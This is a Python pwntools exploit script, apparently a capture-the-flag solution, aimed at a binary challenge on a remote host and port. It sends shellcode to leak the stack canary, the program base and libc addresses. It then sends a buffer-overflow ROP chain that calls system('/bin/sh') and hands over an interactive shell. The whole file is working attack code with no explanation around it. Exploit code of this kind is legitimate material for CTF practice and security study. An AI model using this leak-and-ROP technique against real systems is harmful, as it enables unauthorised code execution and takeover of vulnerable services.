#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.41.207.206 --port 17011 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.41.207.206'
port = int(args.PORT or 17011)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x5555555554aa
b *main+193
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
libc = exe.libc
main = 0x13e9
main_jmp = main +195

p =''
p += asm(shellcraft.write(1, 'rsp', 8*21))
p += asm(shellcraft.read(0, 'rsp', 512))
p += asm(shellcraft.write(4, 'rsp', 104-8+8+160))
p += asm('leave\nret')

io.sendafter("~\n",p)

data = io.recv(8*21)

base_exe = u64(data[:8]) -main_jmp
print hex(base_exe)

can = u64(data[8*18:8*19])
print hex(can)

leak=u64(data[8*20:])
print hex(leak)

libc.address = leak - libc.sym['__libc_start_main']- 234-9
print "base libc",hex(libc.address)


pop_rdi = libc.search(asm('pop rdi ; ret')).next()
pop_rsi = libc.search(asm('pop rsi ; ret')).next()
pop_rdx = libc.address + 0x000000000011c371

p = ''
p += 'a'*(104)
p += p64(can)
p += p64(0)
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rsi)
p += p64(0)
p += p64(pop_rdx)
p += p64(0)
p += p64(0)
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])

io.send(p)

io.interactive()

